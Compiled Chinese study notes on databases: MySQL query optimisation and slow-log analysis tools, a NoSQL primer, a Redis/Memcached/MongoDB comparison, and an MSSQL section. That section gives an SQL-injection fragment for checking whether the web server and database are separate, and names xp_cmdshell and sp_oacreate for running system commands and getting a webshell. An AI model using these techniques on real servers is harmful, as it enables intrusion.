select * from t_user where group_id = 2 and name= '李A' group by age;



但是下面这条sql不会

```
select * from t_user where name = '李A' and age = 21 group by age;

```

**结论: where哪些字段,就group by 哪些字段**
表连接中，order by的列不是驱动表中的
如下sql是会创建临时表的
explain select * from t_user t1 left join t_group t2 on t1.group_id = t2.id order by t2.id;



因为t1和t2连接的时候,t1是驱动表,但是排序使用了被驱动表t2中的字段。改为t1的字段排序就不会出现临时表了,这里就不举例了。

**结论: 连接查询的时候，排序字段使用驱动表的字段**
order by和group by的子句不一样时
explain select * from t_user group by group_id order by `name`;



这种情况只能尽量使用同一个字段来分组和排序了，否则无法避免
distinct查询并且加上order by时
explain select DISTINCT(`name`) from t_user order by age;
这种情况有时候无法避免，只能尽量将distinct的字段和order by的字段使用相同的索引。还有会出现临时表的情况有: from 中的子查询、union，这里就不一一举例了。
总结
sql优化已经是我们后端开发的内化技能之一了，在学习框架，设计思想的同时，不要忘记打牢基础，希望各位能够有所收获。
```

### Slow Log（有什么用，什么时候需要）
```
https://www.cnblogs.com/hjqjk/p/Mysqlslowlog.html
MySQL慢查询日志是MySQL提供的一种日志记录，用来记录执行时长超过指定时长的查询语句，具体指运行时间超过 long_query_time 值的 SQL 语句，则会被记录到慢查询日志中。

long_query_time 默认值是 10 ，单位是 s，即默认是 10秒 。默认情况下，MySQL数据库并不会开启慢查询日志，需要手动设置这个参数。

通过慢查询日志，可以查找出哪些查询语句的执行效率很低，以便进行优化。一般建议开启，它对服务器性能的影响微乎其微，但是可以记录MySQL服务器上执行了很长时间的查询语句。慢查询日志可以帮助我们定位mysql性能问题所在。

MySQL慢查询日志
慢查询日志相关参数
slow_query_log : 是否启用慢查询日志，[1 | 0] 或者 [ON | OFF]

slow_query_log_file : MySQL数据库（5.6及以上版本）慢查询日志存储路径。
                    可以不设置该参数，系统则会默认给一个缺省的文件 HOST_NAME-slow.log

long_query_time : 慢查询的阈值，当查询时间超过设定的阈值时，记录该SQL语句到慢查询日志。

log_queries_not_using_indexes ：设置为 ON ，可以捕获到所有未使用索引的SQL语句(不建议启用)

log_output : 日志存储方式。
            log_output='FILE'，表示将日志存入文件，默认值是'FILE'。      
            log_output='TABLE'，表示将日志存入数据库，这样日志信息就会被写入到 mysql.slow_log 表中。
            MySQL数据库支持同时两种日志存储方式，配置的时候以逗号隔开即可，如：log_output='FILE,TABLE'。
            日志记录到系统的专用日志表中，要比记录到文件耗费更多的系统资源，因此对于需要启用慢查询日志，又需要能够获得更高的系统性能，那么建议优先记录到文件。
5.6之前的版本，有些参数名字不一样：

log-slow-queries : MySQL数据库（5.6以下版本）慢查询日志存储路径。
开启日志
立即生效，重启失效
mysql> set global slow_query_log=ON;
mysql> set global slow_query_log_file='/xxx/mysql-slow.log';
永久生效
修改 my.cnf ：

[mysqld]
slow_query_log           = 1
slow_query_log_file      = /xxx/mysql-slow.log
long_query_time          = 1

# 也可以写成这种形式
slow-query-log           = 1
slow-query-log-file      = /xxx/mysql-slow.log
long-query-time          = 1
重启mysql服务。

关闭日志
临时关闭，重启失效：

mysql> set global slow_query_log=OFF;
永久关闭，修改 my.cnf，重启mysql服务：

[mysqld]
slow_query_log           = 0
MySQL慢查询日志分析
慢查询日志格式说明
打开慢查询日志 mysql-slow.log ，内容都是以下格式：

# Time: 2017-11-22T12:22:32.554299Z
# User@Host: www[www] @  [192.168.10.2]  Id: 580785559
# Query_time: 24.354270  Lock_time: 0.000238 Rows_sent: 1  Rows_examined: 511156
SET timestamp=1511353352;
SELECT * FROM mo_user WHERE email = 'chxxx@hotmail.com' LIMIT 1;
其中参数说明如下：

log 记录的时间：# Time: 2017-11-22T12:22:32.554299Z
SQL 的执行主机：# User@Host: www[www] @ [192.168.10.2] Id: 580785559
SQL 的执行信息（执行时间(单位：s)，锁时间，返回结果行数，查询总行数）：# Query_time: 24.354270 Lock_time: 0.000238 Rows_sent: 1 Rows_examined: 511156;
SQL 执行发生的时间：SET timestamp=1511353352;
SQL 的执行内容：SELECT * FROM mo_user WHERE email = 'chxxx@hotmail.com' LIMIT 1;
mysqldumpslow
mysqldumpslow 是MySQL自带的慢查询日志分析工具(perl脚本)。执行命令 mysqldumpslow --help，显示命令参数如下：

Usage: mysqldumpslow [ OPTS... ] [ LOGS... ]

Parse and summarize the MySQL slow query log. Options are

  --verbose    verbose
  --debug      debug
  --help       write this text to standard output

  -v           verbose
  -d           debug
  -s ORDER     what to sort by (al, at, ar, c, l, r, t), 'at' is default
                al: average lock time
                ar: average rows sent
                at: average query time
                 c: count
                 l: lock time
                 r: rows sent
                 t: query time
  -r           reverse the sort order (largest last instead of first)
  -t NUM       just show the top n queries
  -a           don't abstract all numbers to N and strings to 'S'
  -n NUM       abstract numbers with at least n digits within names
  -g PATTERN   grep: only consider stmts that include this string
  -h HOSTNAME  hostname of db server for *-slow.log filename (can be wildcard),
               default is '*', i.e. match all
  -i NAME      name of server instance (if using mysql.server startup script)
  -l           don't subtract lock time from total time
参数说明：

-v、--verbose : 在详细模式下运行，打印有关该程序的更多信息。

-d、--debug : 在调试模式下运行。

--help : 显示帮助信息并退出程序

-s [sort_type] : sort_type 是信息排序的依据

al：average lock time，按平均等待锁的时间排序
ar：average rows sent，按平均发给客户端的行总数排序
at：average query time，按平均查询时间排序
c：count，按出现总次数排序
l：lock time，按等待锁的时间排序
r：rows sent，按扫描的行总数排序
t：query time，按累计总耗费时间排序

-r : 倒序信息排序

-t NUM: 只显示前 n 个查询，降序

-a : 不把数字抽象为'N'，不把字符串抽象为'S'

-n NUM : 「abstract numbers with at least n digits within names」

-g PATTERN : 根据字符串筛选慢查询日志，可写正则匹配，大小写不敏感。

-h HOSTNAME : 根据服务器名称选择慢查询日志

-i NAME : 根据服务器 MySQL 实例名称选择慢查询日志

-l : 不要将总时间减去锁定时间

mysqldumpslow 分析的结果如下:



Count : 出现次数(Count)
Time : 执行最长时间(Time) 和 累计总耗费时间(Time)
Lock : 等待锁的时间(Lock)
Rows : 发送给客户端的行总数(Rows) 和 扫描的行总数(Rows)
root[root]@localhost : 用户
SHOw FULL ... : SQL语句本身(抽象了格式, 比如 limit 1, 20 用 limit N,N 表示。'N'表示数字，'S'表示字符串)。
例子:
返回记录数最多的10个SQL

mysqldumpslow -s r -t 10 mysql-slow.log

mysqlsla
mysqlsla是 hackmysql.com 推出的一款日志分析工具(该网站还维护了 mysqlreport, mysqlidxchk 等比较实用的mysql工具)
整体来说, 功能非常强大。数据报表,非常有利于分析慢查询的原因, 包括执行频率, 数据量, 查询消耗等。

但是，hackmysql.com官方已经在2015年1月份放弃了对mysqlsla的维护。



安装
解决依赖关系
# yum install  perl-DBI perl-DBD-MySQL 
可能会遇到的问题：Can't locate ExtUtils/MakeMaker.pm，解决如下：

# yum install  perl-ExtUtils-CBuilder  perl-ExtUtils-MakeMaker
可能会遇到的问题：Can't locate Time/HiRes.pm in @INC，解决如下：

# yum install perl-Time-HiRes
下载mysqlsla
当前 mysqlsla 的最新版本为 2.03，到官网下载（官方链接已经失效），可以去这个 有效下载地址 下载。

编译安装
# tar xvfz mysqlsla-2.03.tar.gz 
# cd mysqlsla-2.03
# perl Makefile.PL
# make
# make install
使用
# mysqlsla -lt slow mysql-slow.log 

或者 
# mysqlsla -lt slow mysql-slow.log -sf "+SELECT" -db dbName -top 10 -sort t_sum
参数意义 ：

-lt ：表示日志类型，有: slow, general, binary, msl, udl
-sf ：[+-][TYPE]，包括|不包括，过滤sql语句的类型 [TYPE]有 SELECT, CREATE, DROP, UPDATE, INSERT，例如 "+SELECT,INSERT"，不出现的默认是 - ，即不包括。
-db ：要处理哪个库的日志。
-top ：表示取按规则排序的前多少条。
-sort ：按某种规则排序，t_sum 按总时间排序， c_sum 按总次数排序。c_sum_p : sql语句执行次数占总执行次数的百分比。
对慢查询日志文件的分析，最简化的调用方式如下：

# mysqlsla -lt slow [SlowLogFilePath] > [ResultFilePath]


格式说明如下:

总查询次数 (queries total), 去重后的sql数量 (unique)
输出报表的内容排序方式(sorted by)
最重大的慢sql统计信息, 包括平均执行时间, 等待锁时间, 结果行的总数, 扫描的行总数。
Count： sql的执行次数及占总的slow log数量的百分比.
Time：执行时间, 包括总时间, 平均时间, 最小, 最大时间, 时间占总慢sql时间的百分比.
95% of Time：去除最快和最慢的sql, 覆盖率占95%的sql的执行时间.
Lock Time：等待锁的时间.
95% of Lock ：95%的慢sql等待锁时间.
Rows sent：结果行统计数量, 包括平均, 最小, 最大数量.
Rows examined： 扫描的行数量.
Database：属于哪个数据库
Users：哪个用户,IP, 占到所有用户执行的sql百分比
Query abstract：抽象后的sql语句
Query sample：sql语句个例
pt-query-digest
percona-toolkit 工具介绍
percona-toolkit 是一组高级命令行工具的集合，用来执行各种通过手工执行非常复杂和麻烦的mysql和系统任务。这些任务包括：

检查master和slave数据的一致性
有效地对记录进行归档
查找重复的索引
对服务器信息进行汇总
分析来自日志和tcpdump的查询
当系统出问题的时候收集重要的系统信息
Percona Toolkit整个工具箱提供了非常多实用的工具，具体的使用方法可以参看 官方文档


percona-toolkit安装
安装 percona-toolkit 非常简单，到 官网 下载 .tar.gz 包：

# wget percona.com/get/percona-toolkit.tar.gz
# tar -zxvf percona-toolkit-2.2.5.tar.gz
然后依次执行下面的命令：

# perl Makefile.PL
# make
# make install
默认的会被安装在 /usr/local/bin 目录下。执行 man percona-toolkit 可以查看安装了哪些工具。

运行工具可能会遇到下面的错误：


这是因为缺少相应包，.pm包实际上是perl的包，运行下面的命令安装即可：

yum install -y perl-Time-HiRes
如果安装过程中出现 Error Downloading Packages 错误，尝试 yum clean all 后再安装。使用其Percona Toolkit中其他工具也可能会遇到类似的问题，按照提示安装相应的perl包就可以了。

问题：Can't locate Digest/MD5.pm in @INC
解决：# yum install perl-Digest-MD5

问题：Can't locate ExtUtils/MakeMaker.pm in @INC
解决：# yum install perl-ExtUtils-CBuilder perl-ExtUtils-MakeMaker

pt-query-digest使用
pt-query-digest 可以从普通MySQL日志，慢查询日志以及二进制日志中分析查询，甚至可以从 SHOW PROCESSLIST; 和MySQL协议的tcpdump中进行分析，如果没有指定文件，它从标准输入流（STDIN）中读取数据。

最简单的用法如下：

# pt-query-digest mysql-slow.log
输出信息大致如下:


整个输出分为三大部分：

整体概要（Overall）


这个部分是一个大致的概要信息(类似loadrunner给出的概要信息)，通过它可以对当前MySQL的查询性能做一个初步的评估，比如各个指标的最大值(max)，平均值(min)，95%分布值，中位数(median)，标准偏差(stddev)。
这些指标有查询的执行时间（Exec time），锁占用的时间（Lock time），MySQL执行器需要检查的行数（Rows examine），最后返回给客户端的行数（Rows sent），查询的大小。

查询的汇总信息（Profile）
这个部分对所有 "重要" 的查询(通常是比较慢的查询)做了个一览表:


每个查询都有一个Query ID，这个ID通过Hash计算出来的。pt-query-digest 是根据这个所谓的Fingerprint来group by的。举例下面两个查询的Fingerprint是一样的都是 select * from table1 where column1 = ?，工具箱中也有一个与之相关的工具 pt-fingerprint。

select * from table1 where column1 = 2
select * from table1 where column1 = 3
Rank整个分析中该“语句”的排名，一般也就是性能最常的。
Response time “语句”的响应时间以及整体占比情况。
Calls 该“语句”的执行次数。
R/Call 每次执行的平均响应时间。
V/M 响应时间的差异平均对比率。
在尾部有一行输出，显示了其他2个占比较低而不值得单独显示的查询的统计数据。

详细信息
这个部分会列出Profile表中每个查询的详细信息：（默认是按照总的Exec time排序，降序）



包括Overall中有的信息、查询响应时间的分布情况以及该查询 "入榜" 的理由，最底下会显示该查询SQL语句（真实显示，非抽象格式）。

pt-query-digest 还有很多复杂的操作，这里就不一一介绍了。比如：从PROCESSLIST中查询某个MySQL中最慢的查询：

# pt-query-digest –processlist h=host1
从tcpdump中分析：

# tcpdump -s 65535 -x -nn -q -tttt -i any -c 1000 port 3306 > mysql.tcp.txt
# pt-query-digest --type tcpdump mysql.tcp.txt
从一台机器上将 slow log 保存到另外一台机器上待稍后详细分析：

# pt-query-digest --review h=host2 --no-report slow.log
还可以跟一些过滤条件。详见 官方文档

另外结合一些第三方工具还能生成相应的报表，可以 参考这里

建议 ：当 slow log 很大的时候最好还是将日志文件移到其他机器上进行分析，避免分析时过度消耗该服务器资源。
```

### MSSQL(了解)
```
美国Microsoft公司推出的一种关系型数据库系统。SQL Server是一个可扩展的、高性能的、为分布式客户机/服务器计算所设计的数据库管理系统，实现了与WindowsNT的有机结合，提供了基于事务的企业级信息管理系统方案。
（1）高性能设计，可充分利用WindowsNT的优势。
（2）系统管理先进，支持Windows图形化管理工具，支持本地和远程的系统管理和配置。
（3）强壮的事务处理功能，采用各种方法保证数据的完整性。
（4）支持对称多处理器结构、存储过程、ODBC，并具有自主的SQL语言。 SQLServer以其内置的数据复制功能、强大的管理工具、与Internet的紧密集成和开放的系统结构为广大的用户、开发人员和系统集成商提供了一个出众的数据库平台。
上面是百度百科的资料。

mssql和sqlserver有着很大的不同，sqlserver的结构比较复杂，注入语句也比较复杂。但是如果在注入当中数据库是采用sa用户来运行的，那么我们就可以很轻松的拿下webshell。mssql可以直接启用存储过程来执行命令。

我们来看一下mssql的系统自带数据库的作用。



 

 

 

master 数据库存放着一切对象的信息，sa或者其他用户的密码 以密文存储
model： 存在创建用户数据库的模板
msdb:用户数据库，存放所有的任务调度
tmpdb：临时数据库，在注入时候如果受限制显示位，存在在某表里面，然后再爆数据。重启会清空tempdb的数据
数据库自带用户介绍：

前面带＃号的是mssql 内部用户数据库仅用数据库内部使用
nt开头的是数据库安装的时候创建的


 

 

 

如果msql 执行命令是使用nt serivice\mssqlserver 这个 服务来执行命令 。

 

下面我们来查询个看看，来查看与mysql 不同的地方。

select * from master.dbo.sysobjects where xtype = 'u';
matster是指定数据库名点号后面跟上的是他的架构 再加上表名。

那么我们发现其实这个数据库里面根本没有这张表是怎么回事？

其实这个只是我们的视图，而不是我们真正的表。

sysobjects 是系统的视图，用于存放改数据库内创建的所有对象、如约束、默认值、日志、规则、存储过程，

xtype是代表对象类型：
U：表（用户自定义的表）
V：视图
P ：存储过程
X ：扩展存储过程
我们可以来查询我们所有的数据库名字

select * from master..sysdatabases;


 

 

 

这个查询的也是我们的视图 在mssql里面information这个数据库也都是以视图的形式存在的

查看是否站库分离

 and (select host_name()) = (select @@servername)) 
查询数据库的名字，这个函数可以遍历 在括号里面输入数字可以查询对应的数据库名字

SELECT DB_NAME();
 



 

 

 

这里再来说到mssql的权限划分，

sa：sysadmin      超级管理员权限
dbo : db_owner   数据库管理员权限
public :访问用户权限
 

 

0x02  存储过程

存储过程（Stored Procedure）是在大型数据库系统中，
一组为了完成特定功能的SQL 语句集，它存储在数据库中，一次编译后永久有效
，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。
存储过程是数据库中的一个重要对象。
在数据量特别庞大的情况下利用存储过程能达到倍速的效率提升
那么我们在实战当中就可以利用到存储过程来直接执行cmd命令

常用的存储过程有xp_cmdshell,sp_oacreate  sp_oacreate这个存储过程执行命令无回显，需要输出到txt文件然后进行查看。

在00版本是默认开启xp_cmdshell的 05版本后需要手工开启。

 

0x03  结尾

本次文章耗时3小时，记录一下时间点。下篇文章写mssql各类注入语法与bypass手法
```

### 查询最新5条数据
```
select   *   from   表名   order   by   列名 desc （降序）   limit    显示的条数
```
### NOSQL
```
NoSQL 简介
NoSQL(NoSQL = Not Only SQL )，意即"不仅仅是SQL"。

在现代的计算系统上每天网络上都会产生庞大的数据量。

这些数据有很大一部分是由关系数据库管理系统（RDBMS）来处理。 1970年 E.F.Codd's提出的关系模型的论文 "A relational model of data for large shared data banks"，这使得数据建模和应用程序编程更加简单。

通过应用实践证明，关系模型是非常适合于客户服务器编程，远远超出预期的利益，今天它是结构化数据存储在网络和商务应用的主导技术。

NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至2009年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。

关系型数据库遵循ACID规则
事务在英文中是transaction，和现实世界中的交易很类似，它有如下四个特性：

1、A (Atomicity) 原子性

原子性很容易理解，也就是说事务里的所有操作要么全部做完，要么都不做，事务成功的条件是事务里的所有操作都成功，只要有一个操作失败，整个事务就失败，需要回滚。

比如银行转账，从A账户转100元至B账户，分为两个步骤：1）从A账户取100元；2）存入100元至B账户。这两步要么一起完成，要么一起不完成，如果只完成第一步，第二步失败，钱会莫名其妙少了100元。

2、C (Consistency) 一致性

一致性也比较容易理解，也就是说数据库要一直处于一致的状态，事务的运行不会改变数据库原本的一致性约束。

例如现有完整性约束a+b=10，如果一个事务改变了a，那么必须得改变b，使得事务结束后依然满足a+b=10，否则事务失败。

3、I (Isolation) 独立性

所谓的独立性是指并发的事务之间不会互相影响，如果一个事务要访问的数据正在被另外一个事务修改，只要另外一个事务未提交，它所访问的数据就不受未提交事务的影响。

比如现在有个交易是从A账户转100元至B账户，在这个交易还未完成的情况下，如果此时B查询自己的账户，是看不到新增加的100元的。

4、D (Durability) 持久性

持久性是指一旦事务提交后，它所做的修改将会永久的保存在数据库上，即使出现宕机也不会丢失。


分布式系统
分布式系统（distributed system）由多台计算机和通信的软件组件通过计算机网络连接（本地网络或广域网）组成。

分布式系统是建立在网络之上的软件系统。正是因为软件的特性，所以分布式系统具有高度的内聚性和透明性。

因此，网络和分布式系统之间的区别更多的在于高层软件（特别是操作系统），而不是硬件。

分布式系统可以应用在不同的平台上如：Pc、工作站、局域网和广域网上等。


分布式计算的优点
可靠性（容错） ：

分布式计算系统中的一个重要的优点是可靠性。一台服务器的系统崩溃并不影响到其余的服务器。

可扩展性：

在分布式计算系统可以根据需要增加更多的机器。

资源共享：

共享数据是必不可少的应用，如银行，预订系统。

灵活性：

由于该系统是非常灵活的，它很容易安装，实施和调试新的服务。

更快的速度：

分布式计算系统可以有多台计算机的计算能力，使得它比其他系统有更快的处理速度。

开放系统：

由于它是开放的系统，本地或者远程都可以访问到该服务。

更高的性能：

相较于集中式计算机网络集群可以提供更高的性能（及更好的性价比）。


分布式计算的缺点
故障排除：

故障排除和诊断问题。

软件：

更少的软件支持是分布式计算系统的主要缺点。

网络：

网络基础设施的问题，包括：传输问题，高负载，信息丢失等。

安全性：

开放系统的特性让分布式计算系统存在着数据的安全性和共享的风险等问题。


什么是NoSQL?
NoSQL，指的是非关系型的数据库。NoSQL有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。

NoSQL用于超大规模数据的存储。（例如谷歌或Facebook每天为他们的用户收集万亿比特的数据）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。

为什么使用NoSQL ?
今天我们可以通过第三方平台（如：Google,Facebook等）可以很容易的访问和抓取数据。用户的个人信息，社交网络，地理位置，用户生成的数据和用户操作日志已经成倍的增加。我们如果要对这些用户数据进行挖掘，那SQL数据库已经不适合这些应用了, NoSQL 数据库的发展却能很好的处理这些大的数据。




实例
社会化关系网:

Each record: UserID1, UserID2
Separate records: UserID, first_name,last_name, age, gender,...
Task: Find all friends of friends of friends of ... friends of a given user.
Wikipedia 页面 :

Large collection of documents
Combination of structured and unstructured data
Task: Retrieve all pages regarding athletics of Summer Olympic before 1950.

RDBMS vs NoSQL
RDBMS
- 高度组织化结构化数据
- 结构化查询语言（SQL） (SQL)
- 数据和关系都存储在单独的表中。
- 数据操纵语言，数据定义语言
- 严格的一致性
- 基础事务

NoSQL
- 代表着不仅仅是SQL
- 没有声明性查询语言
- 没有预定义的模式
-键 - 值对存储，列存储，文档存储，图形数据库
- 最终一致性，而非ACID属性
- 非结构化和不可预知的数据
- CAP定理
- 高性能，高可用性和可伸缩性




NoSQL 简史
NoSQL一词最早出现于1998年，是Carlo Strozzi开发的一个轻量、开源、不提供SQL功能的关系数据库。

2009年，Last.fm的Johan Oskarsson发起了一次关于分布式开源数据库的讨论[2]，来自Rackspace的Eric Evans再次提出了NoSQL的概念，这时的NoSQL主要指非关系型、分布式、不提供ACID的数据库设计模式。

2009年在亚特兰大举行的"no:sql(east)"讨论会是一个里程碑，其口号是"select fun, profit from real_world where relational=false;"。因此，对NoSQL最普遍的解释是"非关联型的"，强调Key-Value Stores和文档数据库的优点，而不是单纯的反对RDBMS。


CAP定理（CAP theorem）
在计算机科学中, CAP定理（CAP theorem）, 又被称作 布鲁尔定理（Brewer's theorem）, 它指出对于一个分布式计算系统来说，不可能同时满足以下三点:

一致性(Consistency) (所有节点在同一时间具有相同的数据)
可用性(Availability) (保证每个请求不管成功或者失败都有响应)
分隔容忍(Partition tolerance) (系统中任意信息的丢失或失败不会影响系统的继续运作)
CAP理论的核心是：一个分布式系统不可能同时很好的满足一致性，可用性和分区容错性这三个需求，最多只能同时较好的满足两个。

因此，根据 CAP 原理将 NoSQL 数据库分成了满足 CA 原则、满足 CP 原则和满足 AP 原则三 大类：

CA - 单点集群，满足一致性，可用性的系统，通常在可扩展性上不太强大。
CP - 满足一致性，分区容忍性的系统，通常性能不是特别高。
AP - 满足可用性，分区容忍性的系统，通常可能对一致性要求低一些。



NoSQL的优点/缺点
优点:

- 高可扩展性
- 分布式计算
- 低成本
- 架构的灵活性，半结构化数据
- 没有复杂的关系
缺点:

- 没有标准化
- 有限的查询功能（到目前为止）
- 最终一致是不直观的程序

BASE
BASE：Basically Available, Soft-state, Eventually Consistent。 由 Eric Brewer 定义。

CAP理论的核心是：一个分布式系统不可能同时很好的满足一致性，可用性和分区容错性这三个需求，最多只能同时较好的满足两个。

BASE是NoSQL数据库通常对可用性及一致性的弱要求原则:

Basically Availble --基本可用
Soft-state --软状态/柔性事务。 "Soft state" 可以理解为"无连接"的, 而 "Hard state" 是"面向连接"的
Eventual Consistency -- 最终一致性， 也是是 ACID 的最终目的。

ACID vs BASE
ACID	BASE
原子性(Atomicity)	基本可用(Basically Available)
一致性(Consistency)	软状态/柔性事务(Soft state)
隔离性(Isolation)	最终一致性 (Eventual consistency)
持久性 (Durable)	 

NoSQL 数据库分类
类型	部分代表
特点
列存储	
Hbase

Cassandra

Hypertable

顾名思义，是按列存储数据的。最大的特点是方便存储结构化和半结构化数据，方便做数据压缩，对针对某一列或者某几列的查询有非常大的IO优势。

文档存储

MongoDB

CouchDB

文档存储一般用类似json的格式存储，存储的内容是文档型的。这样也就有机会对某些字段建立索引，实现关系数据库的某些功能。

key-value存储

Tokyo Cabinet / Tyrant

Berkeley DB

MemcacheDB

Redis

可以通过key快速查询到其value。一般来说，存储不管value的格式，照单全收。（Redis包含了其他功能）

图存储

Neo4J

FlockDB

图形关系的最佳存储。使用传统关系数据库来解决的话性能低下，而且设计使用不方便。

对象存储

db4o

Versant

通过类似面向对象语言的语法操作数据库，通过对象的方式存取数据。

xml数据库

Berkeley DB XML

BaseX

高效的存储XML数据，并支持XML的内部查询语法，比如XQuery,Xpath。


谁在使用
现在已经有很多公司使用了 NoSQL：
Google
Facebook
Mozilla
Adobe
Foursquare
LinkedIn
Digg
McGraw-Hill Education
Vermont Public Radio
```

### Redis、Memcached、MongoDB
```
https://www.cnblogs.com/kuhaha/p/9827124.html
>>Memcached
Memcached的优点：
Memcached可以利用多核优势，单实例吞吐量极高，可以达到几十万QPS（取决于key、value的字节大小以及服务器硬件性能，日常环境中QPS高峰大约在4-6w左右）。适用于最大程度扛量。
支持直接配置为session handle。
Memcached的局限性：
只支持简单的key/value数据结构，不像Redis可以支持丰富的数据类型。
无法进行持久化，数据不能备份，只能用于缓存使用，且重启后数据全部丢失。
无法进行数据同步，不能将MC中的数据迁移到其他MC实例中。
Memcached内存分配采用Slab Allocation机制管理内存，value大小分布差异较大时会造成内存利用率降低，并引发低利用率时依然出现踢出等问题。需要用户注重value设计。

>>Redis
Redis的优点：
支持多种数据结构，如 string（字符串）、 list(双向链表)、dict(hash表)、set(集合）、zset(排序set)、hyperloglog（基数估算）
支持持久化操作，可以进行aof及rdb数据持久化到磁盘，从而进行数据备份或数据恢复等操作，较好的防止数据丢失的手段。
支持通过Replication进行数据复制，通过master-slave机制，可以实时进行数据的同步复制，支持多级复制和增量复制，master-slave机制是Redis进行HA的重要手段。
单线程请求，所有命令串行执行，并发情况下不需要考虑数据一致性问题。
支持pub/sub消息订阅机制，可以用来进行消息订阅与通知。
支持简单的事务需求，但业界使用场景很少，并不成熟。

Redis的局限性：
Redis只能使用单线程，性能受限于CPU性能，故单实例CPU最高才可能达到5-6wQPS每秒（取决于数据结构，数据大小以及服务器硬件性能，日常环境中QPS高峰大约在1-2w左右）。
支持简单的事务需求，但业界使用场景很少，并不成熟，既是优点也是缺点。
Redis在string类型上会消耗较多内存，可以使用dict（hash表）压缩存储以降低内存耗用。

Mc和Redis都是Key-Value类型，不适合在不同数据集之间建立关系，也不适合进行查询搜索。比如redis的keys pattern这种匹配操作，对redis的性能是灾难。

>>mongoDB 
mongoDB 是一种文档性的数据库。先解释一下文档的数据库，即可以存放xml、json、bson类型系那个的数据。

这些数据具备自述性（self-describing），呈现分层的树状数据结构。redis可以用hash存放简单关系型数据。

mongoDB 存放json格式数据。

适合场景：事件记录、内容管理或者博客平台，比如评论系统。

1.mongodb持久化原理

mongodb与mysql不同，mysql的每一次更新操作都会直接写入硬盘，但是mongo不会，做为内存型数据库，数据操作会先写入内存，然后再会持久化到硬盘中去，那么mongo是如何持久化的呢
mongodb在启动时，专门初始化一个线程不断循环（除非应用crash掉），用于在一定时间周期内来从defer队列中获取要持久化的数据并写入到磁盘的journal(日志)和mongofile(数据)处，当然因为它不是在用户添加记录时就写到磁盘上，所以按mongodb开发者说，它不会造成性能上的损耗，因为看过代码发现，当进行CUD操作时，记录(Record类型)都被放入到defer队列中以供延时批量（groupcommit）提交写入，但相信其中时间周期参数是个要认真考量的参数，系统为90毫秒，如果该值更低的话，可能会造成频繁磁盘操作，过高又会造成系统宕机时数据丢失过。

2.什么是NoSQL数据库？NoSQL和RDBMS有什么区别？在哪些情况下使用和不使用NoSQL数据库？
NoSQL是非关系型数据库，NoSQL = Not Only SQL。
关系型数据库采用的结构化的数据，NoSQL采用的是键值对的方式存储数据。
在处理非结构化/半结构化的大数据时；在水平方向上进行扩展时；随时应对动态增加的数据项时可以优先考虑使用NoSQL数据库。
在考虑数据库的成熟度；支持；分析和商业智能；管理及专业性等问题时，应优先考虑关系型数据库。

3.MySQL和MongoDB之间最基本的区别是什么？
关系型数据库与非关系型数据库的区别，即数据存储结构的不同。

4.MongoDB的特点是什么？
（1）面向文档（2）高性能（3）高可用（4）易扩展（5）丰富的查询语言

5.MongoDB支持存储过程吗？如果支持的话，怎么用？
MongoDB支持存储过程，它是javascript写的，保存在db.system.js表中。

6.如何理解MongoDB中的GridFS机制，MongoDB为何使用GridFS来存储文件？
GridFS是一种将大型文件存储在MongoDB中的文件规范。使用GridFS可以将大文件分隔成多个小文档存放，这样我们能够有效的保存大文档，而且解决了BSON对象有限制的问题。

7.为什么MongoDB的数据文件很大？
MongoDB采用的预分配空间的方式来防止文件碎片。

8.当更新一个正在被迁移的块（Chunk）上的文档时会发生什么？
更新操作会立即发生在旧的块（Chunk）上，然后更改才会在所有权转移前复制到新的分片上。

9.MongoDB在A:{B,C}上建立索引，查询A:{B,C}和A:{C,B}都会使用索引吗？
不会，只会在A:{B,C}上使用索引。

10.如果一个分片（Shard）停止或很慢的时候，发起一个查询会怎样？
如果一个分片停止了，除非查询设置了“Partial”选项，否则查询会返回一个错误。如果一个分片响应很慢，MongoDB会等待它的响应。

 

>>Redis、Memcache和MongoDB的区别
从以下几个维度，对redis、memcache、mongoDB 做了对比，

1、性能

都比较高，性能对我们来说应该都不是瓶颈

总体来讲，TPS方面redis和memcache差不多，要大于mongodb

2、操作的便利性

memcache数据结构单一

redis丰富一些，数据操作方面，redis更好一些，较少的网络IO次数

mongodb支持丰富的数据表达，索引，最类似关系型数据库，支持的查询语言非常丰富

3、内存空间的大小和数据量的大小

redis在2.0版本后增加了自己的VM特性，突破物理内存的限制；可以对key value设置过期时间（类似memcache）

memcache可以修改最大可用内存,采用LRU算法

mongoDB适合大数据量的存储，依赖操作系统VM做内存管理，吃内存也比较厉害，服务不要和别的服务在一起

4、可用性（单点问题）

对于单点问题，

redis，依赖客户端来实现分布式读写；主从复制时，每次从节点重新连接主节点都要依赖整个快照,无增量复制，因性能和效率问题，

所以单点问题比较复杂；不支持自动sharding,需要依赖程序设定一致hash 机制。

一种替代方案是，不用redis本身的复制机制，采用自己做主动复制（多份存储），或者改成增量复制的方式（需要自己实现），一致性问题和性能的权衡

Memcache本身没有数据冗余机制，也没必要；对于故障预防，采用依赖成熟的hash或者环状的算法，解决单点故障引起的抖动问题。

mongoDB支持master-slave,replicaset（内部采用paxos选举算法，自动故障恢复）,auto sharding机制，对客户端屏蔽了故障转移和切分机制。

5、可靠性（持久化）

对于数据持久化和数据恢复，

redis支持（快照、AOF）：依赖快照进行持久化，aof增强了可靠性的同时，对性能有所影响

memcache不支持，通常用在做缓存,提升性能；

MongoDB从1.8版本开始采用binlog方式支持持久化的可靠性

6、数据一致性（事务支持）

Memcache 在并发场景下，用cas保证一致性

redis事务支持比较弱，只能保证事务中的每个操作连续执行

mongoDB不支持事务

7、数据分析

mongoDB内置了数据分析的功能(mapreduce),其他不支持

8、应用场景

redis：数据量较小的更性能操作和运算上

memcache：用于在动态系统中减少数据库负载，提升性能;做缓存，提高性能（适合读多写少，对于数据量比较大，可以采用sharding）

MongoDB:主要解决海量数据的访问效率问题
```

### 持久化
```
持久化
ACID中的持久化和具体的硬件配置有很大的关系，因为持久化时的性能和具体的服务器CPU，网络，和硬盘有很大的关系，MySQL中跟持久化有关了的配置主要有:

doublewrite buffer的打开和关闭
innodb_flush_log_at_trx_commit的配置
sync_binlog的配置
innodb_file_per_table的配置
存储设备中的电池备份缓存
运行MySQL数据库的操作系统选择，必须要支持fsync() 系统调用
